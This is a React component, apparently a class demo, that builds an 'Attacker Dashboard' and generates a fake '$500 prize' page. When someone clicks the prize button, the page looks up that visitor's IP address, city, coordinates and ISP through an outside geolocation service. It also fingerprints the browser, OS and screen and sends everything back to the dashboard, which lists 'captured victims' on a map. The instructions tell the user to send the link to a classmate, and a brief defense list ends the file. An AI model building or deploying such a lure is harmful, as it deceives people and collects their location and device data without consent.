import React, { useState, useEffect } from 'react';
import { Wifi, MapPin, Monitor, Globe, Clock, User } from 'lucide-react';

export default function IPTrackerDemo() {
  const [victims, setVictims] = useState([]);
  const [victimLink, setVictimLink] = useState('');
  const [showInstructions, setShowInstructions] = useState(true);

  useEffect(() => {
    // Generate the victim link
    const victimPage = generateVictimPage();
    const blob = new Blob([victimPage], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    setVictimLink(url);

    // Listen for messages from victim page
    window.addEventListener('message', (event) => {
      if (event.data.type === 'VICTIM_DATA') {
        setVictims(prev => [...prev, { ...event.data.data, id: Date.now() }]);
      }
    });
  }, []);

  const generateVictimPage = () => {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations! You've Won!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        .prize-icon { font-size: 80px; margin-bottom: 20px; }
        h1 { color: #667eea; margin-bottom: 20px; font-size: 2em; }
        .prize-amount { font-size: 3em; color: #ff6b6b; font-weight: bold; margin: 20px 0; }
        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
        .claim-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 50px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s;
        }
        .claim-button:hover { transform: scale(1.05); }
        .loading { display: none; margin-top: 20px; }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success { display: none; color: #28a745; font-size: 1.5em; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="prize-icon">üéâ</div>
        <h1>Congratulations!</h1>
        <div class="prize-amount">$500</div>
        <p>You've been selected to receive a special prize! Click the button below to claim your reward.</p>
        <button class="claim-button" onclick="claimPrize()">Claim My Prize!</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing your claim...</p>
        </div>
        <div class="success" id="success">‚úÖ Prize claimed successfully!</div>
    </div>

    <script>
        async function claimPrize() {
            document.querySelector('.claim-button').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const data = await collectData();
            
            // Send data back to attacker dashboard
            if (window.opener) {
                window.opener.postMessage({ type: 'VICTIM_DATA', data }, '*');
            }
            
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }, 2000);
        }
        
        async function collectData() {
            let ipData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (error) {
                console.error('Error:', error);
            }
            
            const userAgent = navigator.userAgent;
            return {
                ip: ipData.ip || 'Unable to fetch',
                city: ipData.city || 'Unknown',
                region: ipData.region || 'Unknown',
                country: ipData.country_name || 'Unknown',
                latitude: ipData.latitude || 0,
                longitude: ipData.longitude || 0,
                isp: ipData.org || 'Unknown',
                device: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'Mobile' : 'Desktop',
                browser: getBrowser(userAgent),
                os: getOS(userAgent),
                screen: window.screen.width + 'x' + window.screen.height,
                timestamp: new Date().toLocaleString()
            };
        }
        
        function getBrowser(ua) {
            if (ua.indexOf("Firefox") > -1) return "Firefox";
            if (ua.indexOf("SamsungBrowser") > -1) return "Samsung";
            if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
            if (ua.indexOf("Edge") > -1) return "Edge";
            if (ua.indexOf("Chrome") > -1) return "Chrome";
            if (ua.indexOf("Safari") > -1) return "Safari";
            return "Unknown";
        }
        
        function getOS(ua) {
            if (ua.indexOf("Win") > -1) return "Windows";
            if (ua.indexOf("Mac") > -1) return "MacOS";
            if (ua.indexOf("Linux") > -1) return "Linux";
            if (ua.indexOf("Android") > -1) return "Android";
            if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) return "iOS";
            return "Unknown";
        }
    </script>
</body>
</html>`;
  };

  const openVictimLink = () => {
    window.open(victimLink, '_blank', 'width=700,height=800');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="bg-red-600 text-white px-6 py-4 rounded-lg mb-6 shadow-lg">
          <h1 className="text-3xl font-bold flex items-center gap-3">
            <Wifi className="w-8 h-8" />
            IP Tracker - Attacker Dashboard
          </h1>
          <p className="text-red-100 mt-2">‚ö†Ô∏è Educational Demonstration Only</p>
        </div>

        {/* Instructions */}
        {showInstructions && (
          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-6 mb-6 rounded-lg">
            <div className="flex justify-between items-start">
              <div>
                <h3 className="text-lg font-bold text-yellow-800 mb-2">üìã Demo Instructions:</h3>
                <ol className="list-decimal list-inside space-y-2 text-yellow-800">
                  <li>Click "Open Victim Link" below</li>
                  <li>A fake prize page will open in a new window</li>
                  <li>Send this window to your classmate OR click the button yourself to test</li>
                  <li>When they click "Claim My Prize", their data appears HERE on YOUR screen</li>
                  <li>Show your professor this dashboard with captured data</li>
                </ol>
              </div>
              <button 
                onClick={() => setShowInstructions(false)}
                className="text-yellow-600 hover:text-yellow-800 text-2xl"
              >
                √ó
              </button>
            </div>
          </div>
        )}

        {/* Victim Link Generator */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-6">
          <h2 className="text-xl font-bold mb-4 text-gray-800">üéØ Step 1: Open Attack Page</h2>
          <button
            onClick={openVictimLink}
            className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold text-lg hover:from-purple-700 hover:to-pink-700 transition"
          >
            üîó Open Victim Link (Test It Yourself or Share)
          </button>
          <p className="text-sm text-gray-600 mt-3">
            üí° Tip: For your presentation, open this on another device or send to your classmate
          </p>
        </div>

        {/* Captured Data Dashboard */}
        <div className="bg-white rounded-lg shadow-lg p-6">
          <h2 className="text-2xl font-bold mb-4 text-gray-800 flex items-center gap-2">
            <User className="w-6 h-6 text-red-600" />
            Captured Victims: {victims.length}
          </h2>

          {victims.length === 0 ? (
            <div className="text-center py-12 text-gray-400">
              <Wifi className="w-16 h-16 mx-auto mb-4 opacity-50" />
              <p className="text-lg">Waiting for victims to click the link...</p>
              <p className="text-sm mt-2">Data will appear here automatically</p>
            </div>
          ) : (
            <div className="space-y-4">
              {victims.map((victim) => (
                <div key={victim.id} className="border-2 border-red-500 rounded-lg p-6 bg-red-50">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="flex items-start gap-3">
                      <Globe className="w-5 h-5 text-red-600 mt-1" />
                      <div>
                        <p className="font-bold text-gray-700">IP Address</p>
                        <p className="text-lg text-red-600 font-mono">{victim.ip}</p>
                      </div>
                    </div>

                    <div className="flex items-start gap-3">
                      <MapPin className="w-5 h-5 text-red-600 mt-1" />
                      <div>
                        <p className="font-bold text-gray-700">Location</p>
                        <p className="text-gray-800">{victim.city}, {victim.region}</p>
                        <p className="text-sm text-gray-600">{victim.country}</p>
                      </div>
                    </div>

                    <div className="flex items-start gap-3">
                      <Wifi className="w-5 h-5 text-red-600 mt-1" />
                      <div>
                        <p className="font-bold text-gray-700">ISP Provider</p>
                        <p className="text-gray-800">{victim.isp}</p>
                      </div>
                    </div>

                    <div className="flex items-start gap-3">
                      <Monitor className="w-5 h-5 text-red-600 mt-1" />
                      <div>
                        <p className="font-bold text-gray-700">Device Info</p>
                        <p className="text-gray-800">{victim.device} - {victim.os}</p>
                        <p className="text-sm text-gray-600">{victim.browser}</p>
                      </div>
                    </div>

                    <div className="flex items-start gap-3">
                      <Monitor className="w-5 h-5 text-red-600 mt-1" />
                      <div>
                        <p className="font-bold text-gray-700">Screen</p>
                        <p className="text-gray-800">{victim.screen}</p>
                      </div>
                    </div>

                    <div className="flex items-start gap-3">
                      <Clock className="w-5 h-5 text-red-600 mt-1" />
                      <div>
                        <p className="font-bold text-gray-700">Captured At</p>
                        <p className="text-gray-800">{victim.timestamp}</p>
                      </div>
                    </div>
                  </div>

                  {victim.latitude !== 0 && (
                    <div className="mt-4">
                      <p className="font-bold text-gray-700 mb-2">üìç Location on Map:</p>
                      <iframe 
                        width="100%" 
                        height="300" 
                        frameBorder="0"
                        src={`https://www.openstreetmap.org/export/embed.html?bbox=${victim.longitude-0.1},${victim.latitude-0.1},${victim.longitude+0.1},${victim.latitude+0.1}&layer=mapnik&marker=${victim.latitude},${victim.longitude}`}
                        className="rounded-lg"
                      />
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Defense Info */}
        <div className="bg-blue-50 border-l-4 border-blue-400 p-6 mt-6 rounded-lg">
          <h3 className="text-lg font-bold text-blue-800 mb-2">üõ°Ô∏è How to Defend Against This:</h3>
          <ul className="list-disc list-inside space-y-1 text-blue-800">
            <li>Use a VPN to hide your real IP address</li>
            <li>Don't click suspicious links, even from friends</li>
            <li>Use link preview tools (like CheckShortURL)</li>
            <li>Enable browser security features</li>
            <li>Be suspicious of "prize" or "free gift" messages</li>
          </ul>
        </div>
      </div>
    </div>
  );
}
